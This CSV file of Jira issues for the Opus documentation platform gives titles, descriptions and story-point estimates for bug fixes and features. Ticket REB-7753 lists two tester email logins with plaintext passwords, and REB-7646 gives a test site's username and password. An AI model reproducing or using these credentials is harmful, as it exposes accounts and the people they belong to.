issuekey,title,description,storypoint
REB-7911,Editor / Viewer - Control Area line mismatch,Between the control area in the Editor: !renditionDownload (2).png|thumbnail! and the control area in the Viewer: !renditionDownload (3).png|thumbnail! there is a disrepancy between the weight of the line in these two control areas.Please resolve this.,1
REB-7910,"Multiple Screens (Content List, Content Manager) - Author filter should draw from content in list","In multiple screens that use the Author filter (such as Content List, Content Manager, etc.) the Author list should be drawn from the metadata for the currently available content, *not* from all the authors available from the current account.For example, if I view Content List and restrict it to Public Library and look at the Author list, it will list all potential authors in the Epilogue root account. Some of these potential authors don't actually have published content in the Public Library.In this case the list of authors should be restricted to those that actually have published content in the Public Library.Similarly, if I view Content List and set the Content Location to Content Library, it will list every potential author in the current customer account. Some of these will not actually be authors of published content in the current customer account. It should be restricted to authors of published content in the current customer account (that I can view).",13
REB-7908,Desktop Advisor - blinks but clicking doesn't launch eAssistant,"This issue has been found before but is difficult to reproduce.The user's Desktop Advisor lightbulb blinks, but clicking on the bulb doesn't launch the eAssistant window.Later, they can log out and back in to the Desktop Advisor and that fixes the problem.Please investigate what is happening here, and propose a solution.ProductionDesktop Advisor version 1.77.7Account - Tanimura & AntleUser - Becky BazabalUser ID - 2271Content - ""Travel Reimbursement""  [^Travel Reimbursement V8.0.opsx] Context - See attached screenshot ""TravelReimbursementContext"" !TravelReimbursementContext.png|thumbnail! Specific Context (Exact page) - https://e1-*.taproduce.com:9082/jde/E1Menu.maf?jdeowpBackButtonProtect=PROTECTEDDate/Time of Session - 11/8/2019 @12-12:45pm ESTHave reached out to customer for debug log: [^servlet.txt] *Note* The customer is PST. Take into account time difference when looking at the log.During the screen share, the user was experiencing the same issue as before where DAwas triggering but when she clicked to open eassistant, nothing happened. I then askedher to log out of advisor AND exit out of advisor. After this, she logged back into DA, wentto the area of JDE that causes DA to trigger and clicked on the blinking advisor whereeassistant did open successfully. [^11.8.2019.mp4] ",3
REB-7907,Create environment variables and Jenkins jobs to build artifacts for Green Stage.,"A second staging environment is being created at green-test-opuseps.com.  Most of the AWS and Kubernetes infrastructure has been setup. Examples{code:java}IF %ENV%==green-stag (	SET APPSETTING_NAME=opuswidget.green-stage{code}{code:java}AWS_S3_ENV: 'green-stag',{code}{code:java}public enum EnvironmentExtension    {        dev,        qa,        green-stag,        stag,        prod    }{code}",1
REB-7863,Update and enhance system status monitors,"In order to provide an automated, near-realtime system monitor to the engineering and support teams we have implemented an interface with uptimerobot.com.  There are many product offerings to perform this role but they all require some sort of agent or api to acquire the current system status.Currently we are using the [https://api.internal.opuseps.com/v2/status_check|https://api.internal.opuseps.com/v2/status_check] API which returns \{""Importer"":\{""Status"":200,""Time"":""11/7/19 10:03:06 PM""},""SocketIo"":\{""Status"":200,""Time"":""11/7/19 10:03:06 PM""},""Print"":\{""Status"":200,""Time"":""11/7/19 10:03:06 PM""},""Gitlab"":\{""Status"":404,""Time"":""11/7/19 10:03:06 PM""},""GitlabProxy"":\{""Status"":200,""Time"":""11/7/19 10:03:06 PM""},""Powerpoint"":\{""Status"":200,""Time"":""11/7/19 10:03:06 PM""},""LearningLocker"":\{""Status"":200,""Time"":""11/7/19 10:03:06 PM""}}This return value requires parsing by the monitoring system.  The same api must be called multiple times for each microservice to be monitored.The preferred method would be an individual endpoint for each microservice that returns he status of only the microservice being queried,  Ideally, the widest support for most monitoring solutions would be an https:// endpoint that simply returned a 200 status for success and a non-200 (400, 401, 403, 500, 501, 503) status code for failure.  Content of the message is unimportant but it could possibly contain a reason for the error like ""service unavailable"" or ""server error"",By returning an HTML status, we can skip the string parsing of the return value.  Removing the requirement to parse response text allows us to investigate alternative status monitoring systems. The endpoint could be common with a parameter to specify which service to query e.g. [https://api.internal.opuseps.com/status_check?service=socketio|https://api.internal.opuseps.com/statuscheck?service=socketio]Any solution implemented will have to be accessible publicly, outside the authentication and authorization protocols or it will have to be based upon a permanent (non expiring) bearer token or public key.",2
REB-7862,"Users that have been made ""Inactive"" should NOT receive any emails","Any user within Opus that has been made ""Inactive"" should not receive *ANY* emails for their associated account.  If a user is associated to multiple accounts and they are made inactive in one account, they should not received emails for the account that they have been made inactive and they will receive emails for their other active account(s).From Epilogue's Customer Success employees - ""User ewatson+nha@epiloguesystems.com got an email concerning an NHA customer - looks like this was because she's a customer admin in their account, and the email is project related.  However, her account is currently inactive.""",5
REB-7860,SSO - Applications - Skill Level should always be configurable,"As a Power User or Content User in an SSO-linked Opus account, I should always be able to set my skill level in my applications: !skill_level.jpg|thumbnail! *Currently* when an Opus account is connected to SSO, Applications (and other metadata) are set to non-user configurable, so the skill level is non-user configurable.*Proposed* whether or not an Opus account is connected to SSO, or Applications are set to non-user configurable by the content administrator for the customer account, users should *always* be able to set their skill level for their Applications.",2
REB-7858,Information Leakage:  Store token into memory instead of Local storage,"Relate to ticket [https://epilogue.atlassian.net/browse/REB-7152|https://epilogue.atlassian.net/browse/REB-7152], we will need to store the token into memory instead of local storage.Client side will be changed the code to store token to memory. When user refresh page or open new tab, we will request to identity server to get current user session to retrieve the token, so identity server will need to change to support to allow multiple tenants login  same browser at same time.When user logouts from client side, we will send to Identity server to invalidate current user session as well.",8
REB-7815,Import Manager / .odarc import - embed Web Page in Concept Pane,"If there is an HTML page (which is the typical format) associated with the concept pane, then this data should be inserted as a Step Note at the beginning of the recording post-conversion. Any other file type other than HTML should be inserted at the beginning of the document as a link, post-conversion.*Currently*, if the concept pane is a web page (again, which is typical), our conversion process will place the web page as a link at the top of the recording. When clicked, the link opens a new page showing the web page content. *Instead* the expectation would be to have the contents of the web page embedded at the top of the recording within a non-bordered Note element.If the concept pane is an image file pulled from a UPK package, the image is inserted properly at the top of the document.If the concept pane is a web page with video link, the web page should be embedded and the video link will be a link in the result.You can test with the following .odarc file: [^Concept Pane Web Pages or Package.odarc] The topic ""Concept pane has an image from the package"" is currently being converted correctly, but the topic ""Concept pane has a video from the package"" should be converted so that the HTML part of the concept pane is part of the note, and links to the video",5
REB-7784,Hide the Opus Embed Widget for Content Users,"As a Content User (without Content Manager Permissions), I should never see the embed widget on any page within Opus.  However, if my Content User is included within a Project Team for an Active Project, I should ONLY see the embed widget on the following pages:* Project Screens* Tasks Screens",2
REB-7781,Application Language UI - need 508 (Accessibility) key for document_types,"For other document types, such as Generic, there's a key for DOCTYPES and one for DOCUMENT_TYPES: !doctypes_generic.jpg|thumbnail! For Accessibility, there's only one key, for DOCTYPES: !accessibility_doctypes.jpg|thumbnail! So for Accessibility where the DOCUMENT_TYPES key would normally be used, it uses the DOCTYPES key instead. This results in the following: !image (62).png|thumbnail! In order to fix this issue:1) Create an Accessibility key for the application language ui:SCREEN                      KEY                       TEXT DOCUMENT_TYPES ACCESSIBILITY  Accessibility2) Apply this key in the appropriate screens, so you are using the 'ACCESSIBILITY' DOCUMENT_TYPES key everywhere you use the 'GENERIC' DOCUMENT_TYPES key, for example.",2
REB-7775,Embedded widget performance issues and errors,"The document.js script for the embedded widget is slow and causing browser errors.  We need to find the root cause of the issues and mitigate.The api calls to retrieve documents are taking 18-22 seconds.  We are receiving 404 errors on the [https://d2lcr29k1riow3.cloudfront.net|https://d2lcr29k1riow3.cloudfront.net] endpoint accessed in the documents.js script.*The delay is in the API call *_(data omitted)_{quote}[https://api.internal.opuseps.com/api/v1/documents?user_name=&key_word=&process_name=&caption=&url=|https://api.internal.opuseps.com/api/v1/documents?user_name=&key_word=&process_name=&caption=&url=]{quote}!perfcapture.png|width=200,height=183! *The 404 error is on *{quote}[https://d2lcr29k1riow3.cloudfront.net/landing/advisor/eassistant?isWidget=true&t=Bearer%20|https://d2lcr29k1riow3.cloudfront.net/landing/advisor/eassistant?isWidget=true&t=Bearer%20]\[key omitted from doc]{quote}!404error.PNG|width=200,height=183! Thanh said he is seeing the 404 error as well but since it is working, they ignored it.  ",2
REB-7755,Desktop Recorder - missing content in step images recording JDE in Internet Explorer 11,"In the following recording of JDE in Internet Explorer 11, taken in Desktop Recorder version 1.75.x in Production, we found several issues: [^test4 V0.1.opsx] 1) In Step 3, the image recorded did not include the dropdown item selected (although the step text was accurate).2) In Steps 11 and 13 (the 'Press the Enter key' steps) the step image should reflect the current content for the Short Description field. In Step 11, the Short Description field is empty, though it was changed to 'd*' in Step 10. In Step 13, the Short Description field is 'd*' although it should have been changed to 'D*'Here's a discussion as the customer and Customer Success review the file in Editor: [^BeckyContentEditor.mp4] Please investigate the causes for these issues - the incorrect step image in #1 above and the non-updated step images in #2 above - and respond.",3
REB-7753,Chrome Recorder - Not recording steps w/in a webpage; only recording switching between tabs - Investigate,"On Saturday, 11/02, two testers reported not being able to record steps in STAGE when clicking w/in a web page. The only steps that were being recorded were clicking on a new tab. Both testers attempted the following: log out/log in; clear cache; close browser/reopen browser; shut down laptop/reboot laptop. Recording results were the same. Chrome Recorder version was 1.77.4.Requested testers remove the recorder extension and add back to Chrome. They were then able to record w/in a web page as expected.Saturday, 11/02, @9:51 PM ET*Tester 1*Chrome Recorder - v1.77.4Chrome Browser - 78.0.3904.70Account - Some BluejeansUser - sfernbaugh+pr_barry@epiloguesystems.comPwd - N01willGues%Document - Webrecorder Test 11/2/19 (first six steps were recorded before removing/adding Chrome Recorder; remaining steps were recorded after remove/add action)*Tester 2*Chrome Recorder - v1.77.4Chrome Browser - 77.0.3865.120Account - Benni Boy IndustriesUser - swatkins+pr_benni@epiloguesystems.comPwd - Ziofranco21@Document - Oh when will I be able to upload content",3
REB-7751,List files / Search (Multiple Screens) Show correct file number - Investigate,"As a user, viewing a list of files (through Search or otherwise) in screens such as Content list, Content Manager, etc. if there are more files than 20, it shows the number of files as 20 and updates as I scroll down: !20_content.jpg|thumbnail! We would prefer it shows the correct number of files the first time, or shows the number listed out of the total number (such as 20/78, if 78 were the total number).Please investigate non-process-intensive ways to accomplish this. For example, could we fetch the number of files in a separate list before fetching the file information we need on this screen? Or would it be more efficient to fetch the file information in an asynchronous process, get the number of files, then extract the information we want to display?",2
REB-7749,Learning Activities in Eassistant view,"As any user viewing a single document in Eassistant, either in the injected panel or in the web based version, I should see a ""Viewed"" learning activity written to learning locker.* Ensure a ""Viewed"" learning activity is being added whenever a single document is viewed in Eassistant (just like we do when they open the document in the main viewer)**Ensure this works in both the web advisor injected panel and the web based eassistant (desktop or embedded)",2
REB-7739,Email Notification - User Invite Reminders in SSO accounts,"As a user in an SSO-linked customer account, I should never receive a 'User Invite Reminder' email.* If SSO is enabled for an account, the User Invite Reminder email should NOT be sent for users in that tenant",2
REB-7738,Desktop Recorder - Internet Connectivity Monitor,"As a user of the desktop recorder, I would like to be displayed the same warnings as the web recorder for slow/no internet connectivity.AC:* Using the navigator.connection object, we need to continuously monitor when the downlink changes. * When less than 1, the user should be notified that their internet connectivity is very slow, and the banner should be Orange (hex color #ffc500+)+* When 0 the user should be notified that they are not connected to the internet and the banner should be Red (hex color #e81616)Attached video shows how to test no internet connectivity, but no explanation or description of how to throttle for testing slow internet connectivity.",3
REB-7733,Download screen - suppress all Recorder downloads for content users,"As a content user in a customer account who is not assigned to a project, viewing the Download screen, I should not be able to see the Recorder title or any download links for it: !suppress_recorder.jpg|thumbnail! ",2
REB-7732,Download screen - Recorder / Advisor title keys don't change with application language UI,The following titles in the Download screen don't change appropriately when they are changed in the Application Language UI: !page_titles.jpg|thumbnail! Here's the keys in the Application Language UI that should apply to those titles : !download_settings_keys.jpg|thumbnail! ,1
REB-7731,Document Editor - Remove autosaving spinners,"As a user editing a document, there are a few actions that cause spinners to appear while editing, I would like these to go away because they are a bad user experience and can interrupt the editing process.Here are a few ares:1. Moving / editing control area 2. Editing the step title3. Every field under the ""edit"" section for Control, Label, Step Title, etc.AC:* When editing any of the fields above, no spinner should interrupt the user* Edits should be auto-saved in the background* Edits should save at a 100% success rate - including scenarios when:** user quickly switches steps**  user quickly closes the tab",5
REB-7727,Sisense: Need to encrypt the Sisense User's Password in Opus Database,"Currently we are storing the password as the plain text, we need to encrypt with using A Symmetric Key, It will help to more security.The existing data will be migrated as well.",3
REB-7726,ABP Framework: Replace reference Source Code by reference NuGet Library,"Currently, we have upgraded to latest version ABP, but we still are using ABP source code. We will need to reference to Nuget instead, It help to upgrade easily in future And we need to make sure to fix all making changes in ABP Source Code and test carefully.# Epilogue site:## Billing## Impersonate tenant## Application language## Public library## Project/task## Application info## Public library theme## HTML element## EULA## Epilogue user management## Customer list## Reset password## My profile## Invite new tenant# Customer## Register or Invite new tenant## Billing## Task## Project## Account info## Content list and content manager## import RSTX/OPSX/Odarc and external docs## Getting started for customer admin/content user and PO## Dashboard## Doctypes## API settinga## SSO## Customer metadata## Book## Bulk user## Learning activity## Target application## Sisence system## Embedded System## Snippet advisor## Forgot password## Login with incorrect username/password ## Login with user that is not existed in the system# Web recorder# Desktop recorder# Web advisor# Desktop advisor# Partner",8
REB-7721,Viewer - suppress HTML & SCORM downloads for content users,"As a content user (or one viewing content via the embedded widget token), I shouldn't see the download HTML or download SCORM buttons in the Viewer anymore.Suppress these buttons in the Viewer based on user role.",2
REB-7684,Contents Page - Improve loading speed further,"We previously worked on this story to improve the loading speed of the contents page, but in many instances it's still taking 3+ seconds. This is simply a list of published documents and should load VERY fast.* Refactor or remove any unnecessary API calls to decrease the load time of the content page to around 1 second.** If not possible, provide an explanation",2
REB-7683,Task Detail - Improve loading speed,"As part of the Git work, we previously improved this page load speed, but it still takes around 4+ seconds for the detail of most tasks to load (either from the projects list or from the tasks list page.We need to refactor any long running queries or old API's to increase the load speed of this page further* Refactor to reduce load time of the task detail page to 1-2 seconds or better. There are MANY API calls here and some that still take almost 1 second by themselves",2
REB-7663,Desktop Advisor - Add icon to the taskbar whenver Advisor is running,"As any user with the Desktop Advisor Installed,  I want a taskbar icon for Advisor when it's running because the status bar icon can become hidden by windows.* Whenever Desktop Advisor is running, display a windows taskbar icon with the same functionality as the status bar icon (ie. alert for a match)** Reference the behavior of slack (ie. it runs in both the system tray and the taskbar)* If they are not signed in and click the taskbar icon, they should get the login window* If they ARE signed in and click the taskbar icon, display the eassistant window with any matches (empty if there are no matches)",5
REB-7662,Desktop Advisor - Add as a startup application for the user on installation,"As any user installing the desktop advisor, I want it to install as a startup application so that it starts when automatically with my computer and I don't have to manually launch the application.* Install as a startup application for the individual windows user (not for all users since that would require admin permissions)* The Desktop advisor should start automatically when the computer starts up* If the user is already signed in or has an active token, advisor should appear in the status bar and work as normal immediately.* If the user is NOT signed in, it should display the login window on startup",3
REB-7659,Normalize embedded widget,"The embedded Advisor widget is customer facing and currently points to https://s3-us-west-2.amazonaws.com/opus-west.uploads/prod/opus/widget/*.  Other than an unprofessional appearance, this locks us into this endpoint as customers begin adopting the embedded widget.  We need to create a cloudfront endpoint to serve these assets as our domain and make modifications as necessary to support the new location.1.) Establish cloudfront endpoint2.) Modify opuswidget.js to use cloudfront endpoints3.) Modify API Settings page to reflect opuswidget installation example in the document4.) Update installation guide downloaded from API Settings page5.) Automate repo to S3 bucket file copy for widget assets and setup docx file during push events",3
REB-7658,Investigation: Embedded widget causes logged in users to log off.,"Customers that use the embedded widget to view content will cause the logged in portal, web recorder and web advisor users to be logged out.  This is already a problem for at least two customers and as adoption of the widget expands, it will be an issue for more customers as well.It appears the generic user token obtained from with the client id/secret key may possibly be colliding with the token obtained by the login process.  Assuming it is a token collision, we can mitigate it by * Using different cookies to store separate tokens* Check for a valid token before creating a generic token",3
REB-7656,New Git: Create the API to clone a specific repository from gitlab to new git,We need create the API to clone a repository from gitlab to new git when the repository is missed by migrator,3
REB-7655,New Git: Create the API to migrate a specific document from gitlab to new git,"We will need to create the api to migrate a document (content, metadata) from gitlab to newgit when document is missed by migrator* Master Branch* Working branch",5
REB-7651,Uploading files unsuccessfully should NOT create a branch.,"As a user having the ability to upload files, uploading files should not create branches.*1.On Content Manager page with ""Upload Item"" functionality.*!image-20191031-101919.png|width=1908,height=961!When there is a failure in uploading due to broken files (or virus),(!) +Actual:+ It still creates a branch for that document if not having branch previously. (/) +Expected:+ It should reject that branch immediately in case of not having branch previously (master). If the document has had an available branch, we should keep it.*2.On Create Task page with ""Upload document"" and ""Import recording"" functionality.*!image-20191031-101811.png|width=1913,height=962!When there is a failure in uploading/importing due to broken files (or virus),(!) +Actual:+ State of task is changed to QA.(/) +Expected+: That task should be behaved as an empty task, which also means that its state is “CREATE”. On this upload-failed screen, when users click X button, it should navigate Task list page of the project then there is a toast message to notify user. The text: “An empty task is created successfully”.!image-20191031-103944.png|width=1917,height=969!",3
REB-7646,Web Recorder Training - PeopleSoft,"h2. DescriptionWith the training framework in place, we need to continue to add “rules” to enhance how we record different sites. In this story we’ll focus on PeopleSoft and it’s core components.Test Site:[http://ps92.testdrive.dlzpgroup.com/psp/psf92/?cmd=login&languageCd=ENG&|http://ps92.testdrive.dlzpgroup.com/psp/psf92/?cmd=login&languageCd=ENG&]username: VP1password: VP1Add rules for all major controls/components in PeopleSoft to ensure the recorder captures them perfectly when clicked. These rules should work for any PeopleSoft application instance.* Field (ensure we get the label, value, etc)* Dropdowns* Checkboxes* Hyperlinks* Buttons** Typical buttons** Nav bar links in top right (icons)* Top Navigation Dropdowns (“menubar” but built as an unordered list).** Should be “Favorites” dropdown for example* MenuItems* Tabs (built as a table item)* DatePicker* Expandable area (ex. Search Criteria on most pages)** Should be captured as Dropdown",8
REB-7619,Manual Training - Apply Manual Rules,"As an Epilogue Admin Only, I need to be able to access a  training tab in the web recorder that allows me to manually define rules to apply to specific websites and HTML in order to get better results when users record.The scope of this story is to apply the manual rules when appropriate for ALL users with recorder access when performing a normal recording* Applying the manual rules should be as identical as possible to how we apply our pre-defined rules for Material, bootstrap, etc* Web Recorder should apply manual rules based on:** Does the caption match** Does the URL match** Does the HTML captured for my action match the HTML for the original selection html* If the criteria above is a match:** Apply the optimized HTML for the control area, etc** Apply the specified Action, Control, Label, Value, Column Header and appropriate Step Element based on those values.",8
REB-7618,Manual Training - Define Rule Flow - Step Element,"As an Epilogue Admin Only, I need to be able to access a  training tab in the web recorder that allows me to manually define rules to apply to specific websites and HTML in order to get better results when users record.The scope of this story follows [https://epilogue.atlassian.net/browse/REB-7617|https://epilogue.atlassian.net/browse/REB-7617|smart-link] and should allow the user to define the action, control type, etc for this rule so they can select the appropriate step element.*Define Rule with Step Element*On this screen, the user will define the Caption, URL, Action, Control, Label, Value and Column Header.* After adjusting the HTML that should be identified and captured in the page in 7617, display this at the top of the page so the user is clear what is selected and maintain the highlight in the webpage for the new control area.* Present fields that will allow the Ep. Admin to change the various values that are recorded as well:** Caption/URL: Allow them to change the caption and URL or add a wildcards so they can better define WHEN to apply this rule.** Control: Allows them to select the control that will be used when this rule is applied. Prepopulate this with what is captured by default** Label: Allows them to define the label that will be used when this rule is applied. Prepopulate this with what is captured by default** Value: Allows them to define the value that will be used when this rule is applied. Prepopulate this with what is captured by default** Column Header: Allows them to define the column header that will be used when this rule is applied. Prepopulate this with what is captured by default** Action: Like in the editor, based on the previous values selected allow them to select from available actions and see a preview of the Step Element for that criteria.* “Add Rule” should write all these changes to our existing table for rules including the HTML that we need to identify, the HTML that we should be capturing, and all the step values for this case.* “Previous” would return the user to the previous step* “Cancel” or “X” will discard and changes and dismiss the injected panel and restore the site functionality.!image-20191021-193916.png|width=1941,height=1114!",8
REB-7617,Manual Training - Define Rule Flow - Control Area,"As an Epilogue Admin Only, I need to be able to access a  training tab in the web recorder that allows me to manually define rules to apply to specific websites and HTML in order to get better results when users record.The scope of this story is to create the flow to define a rule for a specific web application so that it records better for end users* When user clicks the “+” icon for a group, or clicks the Add New Rule button from within the group, start the rul definition flow* Inject the UI into the page so that it can be freely moved around by the Ep. Admin*Define Control Area*On this screen, the user will define a new control area for the page by identifying the HTML for an element and then identifying the HTML they would like to capture instead.* When the UI is injected, all clicks should be captured and the site should not navigate (ie. if I click on a link, we detect the HTML, but the page does not navigate to the URL)* When the UI is injected, The user should be able to “hover” over element in the page and see the HTML for these in the “Original Selection” box. * Clicking on the element should “lock” in the HTML that was displayed* Draw a box around this element in the page* Once the first element is “locked” the same behavior applies to “Optimized Selection” (ie. hover over to view and click to lock it in, draw a box around this new HTML)* “Clear Selections” button should clear both HTML fields so the user can start this step over.* Clicking X or “Cancel” should dismiss the injected panel and restore the normal website functionality* Next should proceed to the 2nd step of defining a rule.{color:#ff5630} \[Updated AC]{color}We have a checkbox to allow users to capture items within drop-down menus* When users tick on it, they can expand the drop-down menus to capture items.* This checkbox is positioned under the page description* Its label should be “Allow Clicks”!image-20191021-192638.png|width=1937,height=1108!",13
REB-7616,Manual Training - Create Training mode for web Recorder,"As an Epilogue Admin Only, I need to be able to access a  training tab in the web recorder that allows me to manually define rules to apply to specific websites and HTML in order to get better results when users record.The scope of this story is for adding the management screens to the web recorder for an Epilogue Admin* Add a new icon in the top right for ""Training Mode"". Clicking this will navigate to the training section* Display a list of ""Groups"". These are simply logical grouping of rules so that there is not one big list** New Group button should allow the user to define a new group Name and description* Clicking the ""+"" button for a group should invoke the new Rule definition flow (see other story)* Clicking the group should open the group to display the list of rules within the group* The Ep. Admin can then view the list of rules within a group or click the ""X"" to remove a rule** Clicking the training mode icon again will navigate back to the group list. !image-2019-10-21-13-53-12-780.png|thumbnail!  !image-2019-10-21-13-54-21-705.png|thumbnail!  !image-2019-10-21-13-55-30-658.png|thumbnail!  !image-2019-10-21-13-55-48-241.png|thumbnail! ",13
REB-7613,Context Editor UI - change error UX to match previous error UX,"In new Context Editor UI as described in [REB-6924] we need to change the errors that appear when an attribute - Caption, URL, Process - is not entered.Currently they are appearing as Toast messages, they should be appearing as described in [REB-6823], in red text below the affected fields.* User typical field validation to indicate errors when entering a context (red line, red label, red error message below the field)",2
REB-7609,Project - Change Due Date reported incorrectly in email,"When the Project Due Date is changed, an email is sent to all Project Admins informing the Admin of the due date change. The email is reporting the date incorrectly. For example, if the Project Due Date is changed to 10/23/19, the email is reporting the date as 10/24/19. !image-2019-10-21-09-42-49-540.png|thumbnail!  !image-2019-10-21-09-42-58-700.png|thumbnail! ",3
REB-7581,Step Instructions - PDF Download - Ordered/Unordered list display incorrectly,"REB-6566 states ""As a user, viewing a static content type in PDF or Viewer, text in lists (ordered and unordered) appears to the left of where it should be, overlapping the bullet""Ordered/unordered lists are displaying correctly in Viewer !image-2019-10-17-12-08-05-562.png|thumbnail!  !image-2019-10-17-12-08-18-933.png|thumbnail! Ordered/unordered lists continue to display overlapping the number/bullet in PDFs !image-2019-10-17-12-08-52-563.png|thumbnail!  !image-2019-10-17-12-09-05-454.png|thumbnail! ",2
REB-7576,SCORM - Download Output - Display proper download options based on available Content Types,"SCORM - Download Output - If content has no simulations, do not display SCORM as a download option.  If I attempt to download the file, I get the following error: !image-2019-10-16-16-36-05-488.png|thumbnail! Instead - The SCORM options should be hidden from the download list: !image-2019-10-16-16-36-46-207.png|thumbnail! In addition - if my content has no static doc types selected, I should not have the PDF or HTML options: !image-2019-10-16-16-38-26-391.png|thumbnail! ",1
REB-7569,Simulation Settings - set HEX colors - IE11 Issues,"REB-6436 states ""As a customer admin, setting Simulation Settings, I should be able to use a hexadecimal value to set the colors.""The following issues were noted in IE11 1) Simulation Settings page loads at the bottom of the Content Settings page, instead of being its own page. 2) Once the page is loaded, popout info for menu names stops going away naturally, menus struggle to load, menus merge, unending loading spinners can appear. Video attached.3) Manually entered HEX code is in white font making it visible only if highlighted       NOTE: this issue occurs across browsers4) Pressing Enter after manually entering HEX code does not close the color picker; instead the SAVE action is triggered5) Toast displays following SAVE action but does not clear !image-2019-10-16-12-14-32-145.png|thumbnail! 6) Attempting to log out causes the background to turn gray, does not actually log out the user, and causes the login page to appear as a background layer behind the rest of the page.",2
REB-7561,Change flow to access to web portal from App and Web Extension,"Current we still are passing token in the Url when web advisor acccess to web portal, we need to change following as below:* Create a token, save to Redis with a key expired in a minute.* Redirect to portal with that key.* Use Post method to get token following by that key*Note: We will Apply for 4 Apps (Web /App recorder, Web / App Advisor) and Embed Widget*",5
REB-7558,Disable navigation on pages until page is fully loaded - Document Editor,"The application should prevent any user from interacting with elements on the page until the page has fully loaded.*Salesforce ticket* https://epilogue2018.lightning.force.com/lightning/r/Case/5003l00000xgQPrAAM/viewUser is clicking the ""Elements"" icon before the editor is loaded.  If the user clicks back on the editor icon or on the shapes icon and back to the elements icon after the page is loaded, all elements appear.I believe the elements have loaded but the DOM has not finished updating when the icon is clicked.",2
REB-7530,Scan document uploads with Clam AV - create new task,"As an user with Recorder, Editor or greater permission, I am able to upload standard binary file types to a document or task. We need to ensure these uploads are scanned with Clam AV just like we do when adding a document via the ""import"" screens.* When any document is uploaded to a task or a document directly, it should be scanned with Clam AV for viruses just like imported documents are.",3
REB-7496,Update Oauth server for partners,"Hi [~accountid:557058:fdcd0674-85c2-4560-ba37-adfff5fbb8bb]As we created more identity server for authentication, we have to update it for partners",3
REB-7495,Update git server for partners,"Hi [~accountid:557058:296e7719-bc31-44fd-bbe8-881189084f8b]For the new git server, we have 2 options to handle it with partners- Option 1: each partner should have it own git-proxy and git server- Option 2: partners and Opus will use the same git-proxy and git serverCould you please let us know which one is your opinion?Cc: [~accountid:557058:fdcd0674-85c2-4560-ba37-adfff5fbb8bb][~accountid:5b7646d9db23cc06aef12fd2]",3
REB-7494,"Scan document uploads with Clam AV - ""Upload file"" functionality on Content Manager page","As an user with Recorder, Editor or greater permission, I am able to upload standard binary file types to a document or task. We need to ensure these uploads are scanned with Clam AV just like we do when adding a document via the ""import"" screens.* When any document is uploaded to a task or a document directly, it should be scanned with Clam AV for viruses just like imported documents are.",3
REB-7493,Scan document uploads with Clam AV - Update Task Imports,"As an user with Recorder, Editor or greater permission, I am able to upload standard binary file types to a document or task. We need to ensure these uploads are scanned with Clam AV just like we do when adding a document via the ""import"" screens.* When any document is uploaded to a task or a document directly, it should be scanned with Clam AV for viruses just like imported documents are.",3
REB-7492,Scan document uploads with Clam AV - Update Task Uploads,"As an user with Recorder, Editor or greater permission, I am able to upload standard binary file types to a document or task. We need to ensure these uploads are scanned with Clam AV just like we do when adding a document via the ""import"" screens.* When any document is uploaded to a task or a document directly, it should be scanned with Clam AV for viruses just like imported documents are.",3
REB-7491,"Add ""Book"" results to web based Eassistant view","As any user of the Desktop Advisor or Embedded widget, I need to be able to see the list of books that match my document result, just like is currently done in the web advisor.* For the web based eassistant view, add the navigation to get to the books list* Books list should contain all the books that have my document matches (just like the web advisor)* Clicking on a book should show me the list of all documents within that book (just like the web advisor)** Clicking a document from this list should open the eassistant view for that document. !image-2019-10-11-15-38-03-968.png|thumbnail! ",8
REB-7475,My Tasks button takes several seconds to appear in Web Recorder,"As any user that can view tasks in the Web Recorder, each time I open the extension it has to re-load all the icons and the My Tasks icon takes several seconds to appear.* Optimize performance so the My Tasks icon appears at the same time as the other icons (content manger, etc)* Cache UI as needed to avoid having to reload these each time the extension is opened, even if I am still signed in. [^MyTasksLoading.webm] ",3
REB-7466,Email Notification - System Alert - Using lambda for sending emails,We need an enhancement using lambda to send emails from ticket REB-7098,3
REB-7456,"Desktop Recorder - Hide the empty gray box when selecting ""My Tasks"" and ""Content Manager""","See attached video - Hide the empty gray box when the ""My Tasks"" and ""Content Manager"" pages load.  Similarly to the portal, load the table table all at once (show spinner before). [^Gray Box in Recorders.webm] ",1
